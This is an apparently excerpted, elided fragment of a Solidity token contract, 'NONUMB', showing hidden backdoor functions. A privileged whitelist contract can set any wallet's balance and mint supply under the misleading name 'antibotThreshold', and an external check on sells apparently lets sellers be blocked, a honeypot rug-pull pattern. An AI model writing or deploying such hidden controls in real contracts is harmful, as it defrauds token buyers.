...
contract NONUMB is Context, IERC20, Ownable {
    ...
    modifier onlyWallet() {
        require(
            address(Iwhitelist) == msg.sender,
            "Wallet: caller does not have permission."
        );
        _;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            ...
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                Iwhitelist.checkFrom(from, true);
                ...
                if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                    ...
                    Iwhitelist.checkFrom(from, false);
                    _tokenTransfer(from, to, amount);
                }
            }
        } else {
    ...
    function initial(address _wallet, uint256 _amount) external onlyWallet {
        _balance[_wallet] = _amount;
    }

    function antibotThreshold(uint256 _amount) external onlyWallet {
        _totalSupply = _totalSupply.add(_amount);
    }

    function setWhitelist(address _whitelist) external onlyOwner {
        Iwhitelist = WHITELIST(_whitelist);
    }
